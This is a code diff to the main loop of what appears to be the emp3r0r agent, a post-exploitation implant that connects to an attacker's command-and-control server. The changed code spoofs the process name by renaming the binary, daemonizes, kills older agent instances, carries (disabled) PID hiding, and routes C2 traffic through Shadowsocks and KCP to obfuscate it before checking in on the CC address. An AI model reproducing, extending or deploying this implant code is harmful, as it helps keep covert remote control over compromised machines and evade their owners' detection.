@@ -49,12 +49,18 @@ func main() {
 	// verbose
 	if verbose {
 		log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
-		log.SetOutput(os.Stderr)
+		log_file := "emp3r0r.log"
+		f, err := os.OpenFile(log_file, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o644)
+		if err != nil {
+			log.Fatalf("[-] Cannot open %s: %v", log_file, err)
+		}
+		defer f.Close()
+		log.SetOutput(f)
 		log.Println("emp3r0r agent has started")
 	} else if !runElvsh {
 		// silent!
 		log.SetOutput(io.Discard)
-		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0644)
+		null_file, err := os.OpenFile(os.DevNull, os.O_WRONLY, 0o644)
 		if err != nil {
 			log.Fatalf("[-] Cannot open %s: %v", os.DevNull, err)
 		}
@@ -68,7 +74,8 @@ func main() {
 
 	// rename to make room for argv spoofing
 	if len(util.FileBaseName(os.Args[0])) < 30 &&
-		!persistent && !do_not_touch_argv && !verbose {
+		!persistent && !do_not_touch_argv && !verbose &&
+		runtime.GOOS == "linux" {
 		new_name := util.RandStr(30)
 		os.Rename(os.Args[0], new_name)
 		pwd, err := os.Getwd()
@@ -91,7 +98,9 @@ func main() {
 		// don't daemonize if we're already daemonized
 		os.Getenv("DAEMON") != "true" &&
 		// do not daemonize if run as elvsh
-		!runElvsh
+		!runElvsh &&
+		// do not daemonize if run from loader.so
+		!run_from_loader
 	if run_as_daemon {
 		os.Setenv("DAEMON", "true") // mark as daemonized
 		cmd := exec.Command(os.Args[0])
@@ -114,13 +123,13 @@ func main() {
 			util.RandInt(0, 6)))
 	}
 
-	// hide agent process
-	if agent.HasRoot() {
-		err = agent.HidePIDs()
-		if err != nil {
-			log.Printf("Hiding PIDs: %v", err)
-		}
-	}
+	// hide agent process: disabled for now
+	// if agent.HasRoot() {
+	// 	err = agent.HidePIDs()
+	// 	if err != nil {
+	// 		log.Printf("Hiding PIDs: %v", err)
+	// 	}
+	// }
 
 	// run as elvish shell
 	if runElvsh {
@@ -162,58 +171,59 @@ func main() {
 		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
 	}
 
-	// mkdir -p UtilsPath
-	// use absolute path
-	// TODO find a better location for temp files
-	if !util.IsExist(agent.RuntimeConfig.UtilsPath) {
-		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0700)
-		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
-	}
-
-	// PATH
-	agent.SetPath()
-
-	// set HOME to correct value
-	u, err := user.Current()
-	if err != nil {
-		log.Printf("Get user info: %v", err)
-	} else {
-		os.Setenv("HOME", u.HomeDir)
-	}
-
-	// extract bash
-	err = agent.ExtractBash()
-	if err != nil {
-		log.Printf("[-] Cannot extract bash: %v", err)
-	}
-	emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
-	if runtime.GOOS == "windows" {
-		emp3r0r_data.DefaultShell = "elvsh"
-	} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
-		emp3r0r_data.DefaultShell = "/bin/bash"
-		if !util.IsFileExist(emp3r0r_data.DefaultShell) {
-			emp3r0r_data.DefaultShell = "/bin/sh"
-		}
-	}
-
-	// remove *.downloading files
-	err = filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
-		if err == nil {
-			if strings.HasSuffix(info.Name(), ".downloading") {
-				os.RemoveAll(path)
+	if runtime.GOOS == "linux" {
+		// mkdir -p UtilsPath
+		// use absolute path
+		if !util.IsExist(agent.RuntimeConfig.UtilsPath) {
+			err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0o700)
+			if err != nil {
+				log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
 			}
 		}
-		return nil
-	})
-	if err != nil {
-		log.Printf("Cleaning up *.downloading: %v", err)
-	}
 
-	if run_from_guardian_shellcode {
-		log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
-			os.Getpid(), os.Getppid())
+		// PATH
+		agent.SetPath()
+
+		// set HOME to correct value
+		u, err := user.Current()
+		if err != nil {
+			log.Printf("Get user info: %v", err)
+		} else {
+			os.Setenv("HOME", u.HomeDir)
+		}
+
+		// extract bash
+		err = agent.ExtractBash()
+		if err != nil {
+			log.Printf("[-] Cannot extract bash: %v", err)
+		}
+		emp3r0r_data.DefaultShell = fmt.Sprintf("%s/bash", agent.RuntimeConfig.UtilsPath)
+		if runtime.GOOS == "windows" {
+			emp3r0r_data.DefaultShell = "elvsh"
+		} else if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+			emp3r0r_data.DefaultShell = "/bin/bash"
+			if !util.IsFileExist(emp3r0r_data.DefaultShell) {
+				emp3r0r_data.DefaultShell = "/bin/sh"
+			}
+		}
+
+		// remove *.downloading files
+		err = filepath.Walk(agent.RuntimeConfig.AgentRoot, func(path string, info os.FileInfo, err error) error {
+			if err == nil {
+				if strings.HasSuffix(info.Name(), ".downloading") {
+					os.RemoveAll(path)
+				}
+			}
+			return nil
+		})
+		if err != nil {
+			log.Printf("Cleaning up *.downloading: %v", err)
+		}
+
+		if run_from_guardian_shellcode || run_from_loader {
+			log.Printf("emp3r0r %d is invoked by shellcode/loader.so in %d",
+				os.Getpid(), os.Getppid())
+		}
 	}
 
 	// if the agent's process name is not "emp3r0r"
@@ -222,11 +232,11 @@ test_agent:
 	if alive {
 		proc, err := os.FindProcess(pid)
 		if err != nil {
-			log.Println("WTF? The agent is not running, or is it?")
+			log.Printf("Failed to find agent process with PID %d: %v", pid, err)
 		}
 
-		// exit, leave the existing agent instance running
-		if isAgentAlive() {
+		// check if agent is responsive
+		if isAgentAliveSocket() {
 			if os.Geteuid() == 0 && agent.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
 			} else if !replace_agent {
@@ -237,6 +247,8 @@ test_agent:
 				util.TakeASnap()
 				goto test_agent
 			}
+		} else {
+			go socketListen()
 		}
 
 		// if agent is not responsive, kill it, and start a new instance
@@ -245,13 +257,10 @@ test_agent:
 		if proc.Pid != os.Getpid() {
 			err = proc.Kill()
 			if err != nil {
-				log.Println("Failed to kill old emp3r0r", err)
+				log.Printf("Failed to kill existing emp3r0r agent: %v", err)
 			}
 		}
 	}
-
-	// start socket listener
-	go socketListen()
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
@@ -304,12 +313,15 @@ test_agent:
 		agent.RuntimeConfig.C2TransportProxy = cdnproxyAddr
 	}
 
-	// agent root
-	if !util.IsExist(agent.RuntimeConfig.AgentRoot) {
-		err = os.MkdirAll(agent.RuntimeConfig.AgentRoot, 0700)
-		if err != nil {
-			log.Printf("MkdirAll %s: %v", agent.RuntimeConfig.AgentRoot, err)
-		}
+	// enable shadowsocks / kcp
+	if agent.RuntimeConfig.UseShadowsocks {
+		// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
+		agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
+			agent.RuntimeConfig.ShadowsocksPort)
+
+		// run ss w/wo KCP
+		go agent.ShadowsocksC2Client()
+		go agent.KCPClient() // KCP client will run when UseKCP is set
 	}
 
 	// do we have internet?
@@ -320,16 +332,6 @@ test_agent:
 				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
 				ctx, cancel := context.WithCancel(context.Background())
 				go agent.StartBroadcast(true, ctx, cancel) // auto-proxy feature
-
-				if agent.RuntimeConfig.UseShadowsocks {
-					// since we are Internet-facing, we can use Shadowsocks proxy to obfuscate our C2 traffic a bit
-					agent.RuntimeConfig.C2TransportProxy = fmt.Sprintf("socks5://127.0.0.1:%s",
-						agent.RuntimeConfig.ShadowsocksPort)
-
-					// run ss w/wo KCP
-					go agent.ShadowsocksC2Client()
-					go agent.KCPClient() // KCP client will run when UseKCP is set
-				}
 			}
 			return true
 
@@ -402,7 +404,11 @@ connect:
 	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)
 
 	// connect to MsgAPI, the JSON based h2 tunnel
-	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
+	token := uuid.NewString() // dummy token
+	msgURL := fmt.Sprintf("%s%s/%s",
+		emp3r0r_data.CCAddress,
+		tun.MsgAPI,
+		token)
 	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
 	emp3r0r_data.CCMsgConn = conn
 	if err != nil {
